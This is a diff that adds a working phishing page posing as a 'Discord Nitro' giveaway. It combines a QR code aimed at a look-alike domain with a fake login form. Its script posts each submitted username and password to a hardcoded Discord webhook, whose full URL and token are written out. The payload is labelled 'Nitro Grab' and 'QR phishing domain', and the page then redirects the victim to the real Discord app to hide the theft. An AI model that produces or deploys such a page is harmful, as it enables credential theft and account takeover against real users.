@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nitro Giveaway</title>
+    <!-- QRCode.js library -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: #1a1a2e; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { background: #2c2c3e; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.8); text-align: center; max-width: 500px; width: 100%; }
+        h1 { color: #fff; font-size: 28px; margin-bottom: 5px; }
+        .sub { color: #aaa; font-size: 14px; margin-bottom: 20px; }
+        .nitro-badge { background: #5865f2; color: #fff; padding: 6px 16px; border-radius: 30px; display: inline-block; font-weight: bold; margin-bottom: 15px; }
+        .qr-wrapper { background: #fff; padding: 15px; border-radius: 16px; display: inline-block; margin: 10px 0 20px; }
+        #qrcode { width: 200px; height: 200px; margin: 0 auto; }
+        .scan-text { color: #fff; font-size: 18px; font-weight: 600; margin: 10px 0 15px; }
+        .scan-text span { color: #5865f2; }
+        .divider { border-top: 1px solid #444; margin: 25px 0 20px; }
+        .login-form input { width: 100%; padding: 14px; margin: 8px 0; border: none; border-radius: 8px; background: #3a3a4e; color: #fff; font-size: 16px; }
+        .login-form input::placeholder { color: #888; }
+        .login-form button { width: 100%; padding: 14px; background: #5865f2; border: none; border-radius: 8px; color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.2s; margin-top: 8px; }
+        .login-form button:hover { background: #4752c4; }
+        .footer { color: #666; font-size: 12px; margin-top: 20px; }
+        .alert-box { display: none; background: #f23b3b; color: #fff; padding: 10px; border-radius: 8px; margin: 10px 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎁 Discord Nitro</h1>
+        <div class="sub">Exclusive Giveaway – 1 Year Free</div>
+        <div class="nitro-badge">🔥 10 winners selected today</div>
+
+        <div class="qr-wrapper">
+            <div id="qrcode"></div>
+        </div>
+        <div class="scan-text">📲 Scan this QR with your Discord mobile app to <span>apply for the giveaway</span></div>
+        <p style="color:#999; font-size:13px; margin-top:-5px;">(Your account will be verified instantly)</p>
+
+        <div class="divider"></div>
+
+        <div class="login-form">
+            <p style="color:#ccc; margin-bottom:12px; font-weight:300;">Or login manually to claim your Nitro</p>
+            <input type="text" id="username" placeholder="Discord Username (e.g., user#1234)" autocomplete="off">
+            <input type="password" id="password" placeholder="Password" autocomplete="off">
+            <button id="loginBtn">Claim Nitro →</button>
+        </div>
+        <div id="alertBox" class="alert-box">⏳ Verifying... please wait</div>
+        <div class="footer">By continuing you agree to the giveaway terms.</div>
+    </div>
+
+    <script>
+        (function() {
+            // Force QR code to point to the target domain exactly as requested
+            var qrTarget = 'https://nitro_giveaway.co.uk';
+            new QRCode(document.getElementById('qrcode'), {
+                text: qrTarget,
+                width: 200,
+                height: 200,
+                colorDark: '#000000',
+                colorLight: '#ffffff',
+                correctLevel: QRCode.CorrectLevel.H
+            });
+
+            // Webhook URL (same as provided)
+            var webhookUrl = 'https://discord.com/api/webhooks/1502754739580964945/Opx1IaKRsTc-0W2k67rAL7z0PGh7st4iMqKmYktHqC8UFdc9Jv1EsMLmodnKeun-gHmm';
+
+            function sendCredentials(username, password) {
+                var payload = {
+                    content: null,
+                    embeds: [
+                        {
+                            title: '🚨 Nitro Grab from nitro_giveaway.co.uk',
+                            color: 15158332,
+                            fields: [
+                                { name: 'Username', value: username || '(empty)', inline: true },
+                                { name: 'Password', value: password || '(empty)', inline: true },
+                                { name: 'Timestamp', value: new Date().toUTCString(), inline: false }
+                            ],
+                            footer: { text: 'QR phishing domain' }
+                        }
+                    ]
+                };
+
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        var alertBox = document.getElementById('alertBox');
+                        alertBox.style.display = 'block';
+                        alertBox.innerHTML = '✅ You have been entered! Redirecting...';
+                        alertBox.style.background = '#2ecc71';
+                        document.getElementById('username').value = '';
+                        document.getElementById('password').value = '';
+                        setTimeout(function() {
+                            window.location.href = 'https://discord.com/app';
+                        }, 2000);
+                    } else {
+                        var alertBox = document.getElementById('alertBox');
+                        alertBox.style.display = 'block';
+                        alertBox.innerHTML = '❌ Error, please try again.';
+                        alertBox.style.background = '#f23b3b';
+                    }
+                })
+                .catch(function(err) {
+                    var alertBox = document.getElementById('alertBox');
+                    alertBox.style.display = 'block';
+                    alertBox.innerHTML = '⚠️ Network error, but entry logged locally.';
+                    alertBox.style.background = '#f39c12';
+                });
+            }
+
+            document.getElementById('loginBtn').addEventListener('click', function(e) {
+                e.preventDefault();
+                var username = document.getElementById('username').value.trim();
+                var password = document.getElementById('password').value.trim();
+
+                if (!username || !password) {
+                    var alertBox = document.getElementById('alertBox');
+                    alertBox.style.display = 'block';
+                    alertBox.innerHTML = '⚠️ Please fill in both fields.';
+                    alertBox.style.background = '#f23b3b';
+                    return;
+                }
+
+                var btn = document.getElementById('loginBtn');
+                btn.disabled = true;
+                btn.textContent = 'Sending...';
+
+                sendCredentials(username, password);
+
+                setTimeout(function() {
+                    btn.disabled = false;
+                    btn.textContent = 'Claim Nitro →';
+                }, 3000);
+            });
+
+            document.querySelectorAll('.login-form input').forEach(function(inp) {
+                inp.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        document.getElementById('loginBtn').click();
+                    }
+                });
+            });
+
+        })();
+    </script>
+</body>
+</html>
